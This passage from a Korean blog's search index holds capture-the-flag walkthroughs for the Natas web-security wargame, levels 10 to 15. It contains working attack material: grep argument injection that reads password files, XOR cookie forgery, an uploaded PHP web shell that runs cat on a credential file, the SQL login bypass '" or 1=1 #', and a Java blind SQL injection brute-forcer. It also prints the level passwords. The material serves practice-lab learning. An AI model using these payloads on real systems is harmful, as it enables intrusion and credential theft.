value=Search&gt;&lt;br&gt;&lt;br&gt; &lt;/form&gt; Output: &lt;pre&gt; &lt;? $key = &quot;&quot;; if(array_key_exists(&quot;needle&quot;, $_REQUEST)) { $key = $_REQUEST[&quot;needle&quot;]; } if($key != &quot;&quot;) { if(preg_match('/[;|&amp;]/',$key)) { print &quot;Input contains an illegal character!&quot;; } else { passthru(&quot;grep -i $key dictionary.txt&quot;); } } ?&gt; &lt;/pre&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 소스코드를 보니 [,;,|,&amp;]의 특수문자가 입력되지 않아야 passthru가 실행 된다. 다른 특수문자를 이용한 커맨드 인젝션 문제인줄 알았지만 무수한 삽질 끝에 아니라는 것을 알게 되었다. 그냥 grep을 이용하여 파일의 내용을 출력하는 것이 좋을 것 같다.문법을 맞추기만 하면 실행되니 다음과 같은 명령어를 입력한다. ‘[a-z]’ /etc/natas_webpass/natas11 a부터 z가 포함된 문자열을 /etc/natas_webpass/natas11에서 추출되게 하는 것이다. 파일 경로는 전단계에서 사용하던 경로를 통해 유추를 할 수 있다. level11의 패스워드를 찾았다! U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK","link":"/2022/01/20/Natas/natas10/"},{"title":"Natas 워게임 level11 풀이","text":"Level Goal Cookies are protected with XOR encryptionBackground color 쿠키는 XOR 암호화로 보호됩니다. 배경색 Username: natas11URL: http://natas11.natas.labs.overthewire.org 쿠기가 XOR 암호화로 보호 되어있다고 한다.아마 XOR 관련문제 인것 같다. 입력한 색상코드로 배경색을 바꿔주는 입력창과소스코드 하이퍼 링크가 있다. 소스 코드를 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas11&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;? $defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;); // 초기값 function xor_encrypt($in) { $key = '&lt;censored&gt;'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i&lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } function loadData($def) { global $_COOKIE; $mydata = $def; //$defaultdata불러오기 if(array_key_exists(&quot;data&quot;, $_COOKIE)) { 쿠기값에서 data키나 인덱스가 있다면 $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true); json형식의 문자열에서 배열로 바꾼다. (쿠기값) if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) { //tempdata가 배열이면서 tempdata에 showpassword키와 bgcolor키가 있다면 if (preg_match('/^#(?:[a-f\\d]{6})$/i', $tempdata['bgcolor'])) { // tempdata의 bgcolor 값에 맨 앞에 #이 붙고 a~f(숫자포함)의 6자리가 오는 패턴이 보인다면 $mydata['showpassword'] = $tempdata['showpassword']; //$defaultdata값에 있던 showpassword값을 tempdata에 있는 showpassword로 변경 $mydata['bgcolor'] = $tempdata['bgcolor']; //$defaultdata값에 있던 bgcolor값을 tempdata에 있는 bgcolor로 변경 } } } return $mydata; } function saveData($d) { setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d)))); } $data = loadData($defaultdata); if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $_REQUEST['bgcolor'])) { $data['bgcolor'] = $_REQUEST['bgcolor']; } } saveData($data); ?&gt; &lt;h1&gt;natas11&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;body style=&quot;background: &lt;?=$data['bgcolor']?&gt;;&quot;&gt; Cookies are protected with XOR encryption&lt;br/&gt;&lt;br/&gt; &lt;? if($data[&quot;showpassword&quot;] == &quot;yes&quot;) { //showpassword 값이 yes라면 패스워드 출력 print &quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;; } ?&gt; &lt;form&gt; Background color: &lt;input name=bgcolor value=&quot;&lt;?=$data['bgcolor']?&gt;&quot;&gt; &lt;input type=submit value=&quot;Set color&quot;&gt; &lt;/form&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 쿠기값에서 showpassword값을 no의 yes로 바꾸어 주면 될 것 같다. 쿠기값 : - ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw 쿠기값을 복호화 하려고 했지만 XOR 키값을 몰라 진행이 안된다. 무수한 삽질 끝에 포기하고 답지를 보았다.그리고 알아냈다.XOR의 특성을 이용하면 된다!!!!!!!!!!! a ^ b = ca ^ c = b 이 특성을 XOR암호화 함수에 대입하면 $defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;); function xor_encrypt($in) { $key = '&lt;censored&gt;'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i&lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } function saveData($d) { setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d)))); } $data = loadData($defaultdata); saveData($data); text ^ key = out text a ^ b = c json_encode($defaultdata) ^ key = ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw a ^ c = b json_encode($defaultdata) ^ ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw = key 이를 통해 key값을 찾아낸다. 원래 있던 코드를 고치면 편하기에 온라인 php실행기에서 진행하였다. &lt;?php function xor_encrypt() { $defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;); $text = base64_decode(&quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw&quot;); $outText = json_encode($defaultdata); $key=''; for($i=0;$i&lt;strlen($text);$i++) { $key .= $outText[$i] ^ $text[$i % strlen($text)]; } return $key; } print xor_encrypt(); ?&gt; qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq qw8J가 반복되고 있다.아마 키는 qw8J인것 같다. key = qw8J 키값을 찾아냈다. 키값을 찾았으니 showpassword값이 yes인 상태에서의 쿠기값을 찾으면 된다. &lt;?php function xor_encrypt() { $defaultdata = array( &quot;showpassword&quot;=&gt;&quot;yes&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;); $key = 'qw8J'; $text = json_encode($defaultdata); $outText = ''; for($i=0;$i&lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return base64_encode($outText); } print xor_encrypt(); ?&gt; ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK 쿠기값을 변경하여 요청을 보내면 끝이다. level12의 패스워드를 찾았다! EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3","link":"/2022/01/20/Natas/natas11/"},{"title":"Natas 워게임 level12 풀이","text":"Level Goal Choose a JPEG to upload (max 1KB) 업로드할 JPEG 선택(최대 1KB) Username: natas12URL: http://natas12.natas.labs.overthewire.org 파일을 업로드할 수 있는 버튼과 소스코드 하이퍼 링크가 있다. 소스코드를 본다! &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas12&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas12&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;? function genRandomString() { //10자리 랜덤의 파일 이름 생성 $length = 10; $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;; $string = &quot;&quot;; for ($p = 0; $p &lt; $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters)-1)]; } return $string; } function makeRandomPath($dir, $ext) { //랜덤으로 생성된 파일의 경로를 지정하고 확장자 붙이기 do { $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext; } while(file_exists($path)); return $path; } function makeRandomPathFromFilename($dir, $fn) { //파라미터로 받은 값에서 확장자 추출 $ext = pathinfo($fn, PATHINFO_EXTENSION); //PATHINFO_EXTENSION:파일 확장자 추출 return makeRandomPath($dir, $ext); } if(array_key_exists(&quot;filename&quot;, $_POST)) { $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]); if(filesize($_FILES['uploadedfile']['tmp_name']) &gt; 1000) { echo &quot;File is too big&quot;; } else { if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { //파일을 임시 폴더에 옮긴다음 target_path로 다시 옮김 echo &quot;The file &lt;a href=\\&quot;$target_path\\&quot;&gt;$target_path&lt;/a&gt; has been uploaded&quot;; } else{ echo &quot;There was an error uploading the file, please try again!&quot;; } } } else { ?&gt; &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot; /&gt; //랜덤으로 생성한 이름에 확장자 추가 Choose a JPEG to upload (max 1KB):&lt;br/&gt; &lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; /&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&gt; &lt;/form&gt; &lt;? } ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 이번 문제는 파일 업로드를 이용한 문제 인것 같다.passthru를 이용하면 php에서 시스템 명령어를 실행하고 출력할 수 있다. 외부 프로그램을 실행하고 실행되는 동안 화면을 실시간으로 출력하는 함수 다음과 같은 php파일을 만든다. &lt;?php passthru(&quot;cat /etc/natas_webpass/natas13&quot;) ?&gt; 이제 파일을 업로드 해본다. 하지만 실행이 되지않는다. 소스코드 아래 쪽을 보면 어떠한 확장자를 붙인 파일을 올려도 이름을 랜덤으로 생성하고 .jpg를 붙여서 요청을 한다. jpg로 열리기에 제대로 실행되지 않는다. 확장자에 대한 필터가 없기에요청할때 확장자를 바꾸어 요청하면 될 거 같다. 확장자가 제대로 원하는대로 바뀌었다. 파일을 열어 본다. level13의 패스워드를 찾았다! jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY","link":"/2022/01/21/Natas/natas12/"},{"title":"Natas 워게임 level13 풀이","text":"Level Goal For security reasons, we now only accept image files!Choose a JPEG to upload (max 1KB) 보안상의 이유로 이제 이미지 파일만 받습니다! 업로드할 JPEG 선택(최대 1KB) Username: natas13URL: http://natas13.natas.labs.overthewire.org 이번엔 전단계와 비슷하지만 이미지 파일만 받도록 되어 있다고 한다. 소스코드를 본다! &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas13&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas13&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; For security reasons, we now only accept image files!&lt;br/&gt;&lt;br/&gt; &lt;? function genRandomString() { $length = 10; $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;; $string = &quot;&quot;; for ($p = 0; $p &lt; $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters)-1)]; } return $string; } function makeRandomPath($dir, $ext) { do { $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext; } while(file_exists($path)); return $path; } function makeRandomPathFromFilename($dir, $fn) { $ext = pathinfo($fn, PATHINFO_EXTENSION); return makeRandomPath($dir, $ext); } if(array_key_exists(&quot;filename&quot;, $_POST)) { $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]); $err=$_FILES['uploadedfile']['error']; if($err){ if($err === 2){ //값 뿐만 아니라 데이터 타입도 2라면 (이미지의 데이터 타입 값은 2다.) echo &quot;The uploaded file exceeds MAX_FILE_SIZE&quot;; } else{ echo &quot;Something went wrong :/&quot;; } } else if(filesize($_FILES['uploadedfile']['tmp_name']) &gt; 1000) { echo &quot;File is too big&quot;; } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { //이미지가 아니라면 &gt; exif_imagetype : 이미지의 첫 바이트를 읽고 서명을 확인합니다. echo &quot;File is not an image&quot;; } else { if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { echo &quot;The file &lt;a href=\\&quot;$target_path\\&quot;&gt;$target_path&lt;/a&gt; has been uploaded&quot;; } else{ echo &quot;There was an error uploading the file, please try again!&quot;; } } } else { ?&gt; &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot; /&gt; Choose a JPEG to upload (max 1KB):&lt;br/&gt; &lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; /&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&gt; &lt;/form&gt; &lt;? } ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 기존 소스코드에 이번에 파일을 업로드 해도 이미지 파일이 아니라면 업로드가 안되는 코드가 추가되었다. exif_imagetype를 통해 파일의 코드를 읽어 jpg인지 아닌지 확인한다.그렇다면 jpg 파일코드 즉 jpg 시그니처 코드를 붙이면 될 것 같다. 파일시그니처란파일 형식마다 가지고 있는 고유의 특징, 포맷에 대한 정보 jpg 시그니처 코드는 다음과 같다. 헤더 시그니처 푸터 시그니처 FF D8 FF E0FF D8 FF E8 FF D9 이를 HxD프로그램을 이용하여 전단계에서 만든 파일에 수정한 뒤 시그니처를 넣어준다. 이를 업로드 해본다. 전단계와 같이 요청할때 파일의 확장자를 .php로 바꾸어 준다. php파일인데 파일이 제대로 업로드 되었다.파일을 실행해본다. level14의 패스워드를 찾았다! Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1","link":"/2022/01/22/Natas/natas13/"},{"title":"Natas 워게임 level14 풀이","text":"Level Goal Username:Password: 사용자 이름: 비밀번호: Username: natas14URL: http://natas14.natas.labs.overthewire.org 일단 소스코드를 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas14&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas14&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;? if(array_key_exists(&quot;username&quot;, $_REQUEST)) { $link = mysql_connect('localhost', 'natas14', '&lt;censored&gt;'); mysql_select_db('natas14', $link); $query = &quot;SELECT * from users where username=\\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\\&quot; and password=\\&quot;&quot;.$_REQUEST[&quot;password&quot;].&quot;\\&quot;&quot;; if(array_key_exists(&quot;debug&quot;, $_GET)) { echo &quot;Executing query: $query&lt;br&gt;&quot;; } if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) { echo &quot;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&quot;; } else { echo &quot;Access denied!&lt;br&gt;&quot;; } mysql_close($link); } else { ?&gt; &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; Username: &lt;input name=&quot;username&quot;&gt;&lt;br&gt; Password: &lt;input name=&quot;password&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Login&quot; /&gt; &lt;/form&gt; &lt;? } ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 유저이름과 패스워드를 입력받아 데이터베이스와 일치하는 값이 있으면 natas15의 패스워드를 출력해준다. natas15 패스워드를 출력하기 위해선 natas15의 패스워드를 알아야한다. 참 모순적이다. 아마 sql injection을 이용해 문제를 풀어야 되는 것 같다. 쿼리구문에서 유저 이름과 패스워드를 입력받아 select문을 실행하는데필터링 없이 문자열을 그래도 갖고와 실행하고 있다. 문법만 맞춘다면 패스워드를 몰라도 명령어를 실행해 패스워드를 얻어낼수 있다. 다음과 같이 유저 이름 부분에만 입력한다. “ or 1 = 1 # (“를 사용해 입력 부분을 닫아주고 or 1=1을 사용하여 참이 되게한다. 다음 # 주석을 사용하여 뒤 부분이 실행되지 않도록 한 것이다. ) 이를 실행하면 natas15의 패스워드가 출력된다. level15의 패스워드를 찾았다! AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J","link":"/2022/01/23/Natas/natas14/"},{"title":"Natas 워게임 level15 풀이","text":"Level Goal Username:check existence 사용자 이름: 존재 확인 Username: natas15URL: http://natas15.natas.labs.overthewire.org 유저 이름을 입력하면 해당유저가 존재하는지 확인해주는 것 같다. 일단 소스코드를 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas15&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas15&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;? /* CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL ); */ if(array_key_exists(&quot;username&quot;, $_REQUEST)) { $link = mysql_connect('localhost', 'natas15', '&lt;censored&gt;'); mysql_select_db('natas15', $link); $query = &quot;SELECT * from users where username=\\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\\&quot;&quot;; if(array_key_exists(&quot;debug&quot;, $_GET)) { echo &quot;Executing query: $query&lt;br&gt;&quot;; } $res = mysql_query($query, $link); //쿼리가 실행됬면 참 쿼리가 실행되지 않으면 거짓 if($res) { if(mysql_num_rows($res) &gt; 0) { //쿼리를 실행해서 나온 레코드 갯수를 카운트해서 0이상이면 echo &quot;This user exists.&lt;br&gt;&quot;; } else { echo &quot;This user doesn't exist.&lt;br&gt;&quot;; } } else { echo &quot;Error in query.&lt;br&gt;&quot;; } mysql_close($link); } else { ?&gt; &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; Username: &lt;input name=&quot;username&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Check existence&quot; /&gt; &lt;/form&gt; &lt;? } ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 유저이름을 입력하면 존재유무만 출력할 뿐 패스워드의 정보는 주지 않는다.하지만 조건에 충족하기만 한다면 존재유무를 알려주기 때문에 하나씩 실행하면서 확인해 보면 될 것 같다. 먼저 natas16이 존재하는지 확인한다. natas16 육안으로 구별하기 위해 get방식으로도 해보았다. 그냥 유저 이름 입력란을 사용해도 무관하다. natas16이 있는걸 확인했다.다시 소스코드를 돌아가면 users테이블에 username말고도 password컬럼도 있다. 혹시 패스워드가 NULL값으로 되어 있는지 확인해 보았다. natas16” AND NOT password IS NULL# 당연하게도 null값이 아니었다.이제 패스워드의 존재를 알았으니 길이를 알아내면 될것 같다. 패스워드의 길이를 하나씩 바꿔가면 노가다를 하여 길이가 32라는 것을 알아내었다. natas16” and length(password)=32# 여기까진 괜찮은데 32개 패스워드를 하나씩 대입해 알아내기엔 너무 많은 경우의 수가 있어서 불가능하다.하지만 나는 소켓 프로그래밍은 처음(응애 나 아기 초보)이라 일단 대략적인 틀은 복사하고 필요한 부분을 추가하여 넣었다.. import java.io.BufferedReader; import java.io.InputStreamReader; import java.io.PrintStream; import java.net.Socket; public class SimpleHttpClient { public static void main(String[] args) throws Exception { String a= &quot;&quot;; for (int i = 1; i &lt;= 32; i++) { for (int j = 48; j &lt;= 123; j++) { if (58 &lt;= j &amp;&amp; j &lt;= 64) { continue; } if (91 &lt;= j &amp;&amp; j &lt;= 96) { continue; } // 소켓 및 입출력 스트림 준비 Socket socket = new Socket(&quot;176.9.9.172&quot;, 80); BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream())); PrintStream out = new PrintStream(socket.getOutputStream()); // 요청라인 out.println(&quot;GET /index.php?username=natas16%22%20and%20ascii(substr(password,&quot;+ Integer.toString(i) +&quot;,1))=&quot;+ Integer.toString(j) + &quot;%20%23 HTTP/1.1&quot;); // 헤더정보 out.println(&quot;Host: natas15.natas.labs.overthewire.org&quot;); out.println(&quot;Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==&quot;); out.println(); // 응답 내용 String line = null; while((line = in.readLine()) != null) { if(line.contains(&quot;This user exists.&quot;)){ a = a+j+&quot; &quot;; in.close(); out.close(); socket.close(); break; } } in.close(); out.close(); socket.close(); } System.out.println(a); } } } 다른 답지를 보니 파이썬을 이용하였는데 아마 더 간단하게 스크립트를 짤수 있어서 그런 것 같다.응애..너무 오래 걸려 중간에 연결이 끊어진다.그럼 i값을 변경하여 다시 돌리면 된다. 87 97 73 72 69 97 99 106 54 51 119 110 78 73 66 82 79 72 101 113 105 51 112 57 116 48 109 53 110 104 109 104 10 10 아주 오랜 시간이 소요되었다!!! 나온 값을 아스키코드로 다시 변환하면 끝이다!!!!!!! level16의 패스워드를 찾았다! WaIHEacj63wnNIBROHeqi3p9t0m5nhmh","link":"/2022/01/24/Natas/natas15/"}],"tags":[{"name":"bandit","slug":"bandit","link":"/tags/bandit/"},{"name":"natas","slug":"natas","link":"/tags/natas/"},{"name":"XOR","slug":"XOR","link":"/tags/XOR/"},{"name":"robots.txt","slug":"robots-txt","link":"/tags/robots-txt/"},{"name":"burp suite","slug":"burp-suite","link":"/tags/burp-suite/"},{"name":"cookie","slug":"cookie","link":"/tags/cookie/"},{"name":".inc","slug":"inc","link":"/tags/inc/"},{"name":"암호","slug":"암호","link":"/tags/%EC%95%94%ED%98%B8/"},{"name":"command injection","slug":"command-injection","link":"/tags/command-injection/"},{"name":"file upload","slug":"file-upload","link":"/tags/file-upload/"},{"name":"HxD","slug":"HxD","link":"/tags/HxD/"},{"name":"파일 시그니처","slug":"파일-시그니처","link":"/tags/%ED%8C%8C%EC%9D%BC-%EC%8B%9C%EA%B7%B8%EB%8B%88%EC%B2%98/"},{"name":"sql injection","slug":"sql-injection","link":"/tags/sql-injection/"},{"name":"blind sql injection","slug":"blind-sql-injection","link":"/tags/blind-sql-injection/"}],"categories":[{"name":"웹해킹","slug":"웹해킹","link":"/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/"},{"name":"natas","slug":"웹해킹/natas","link":"/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/natas/"}]}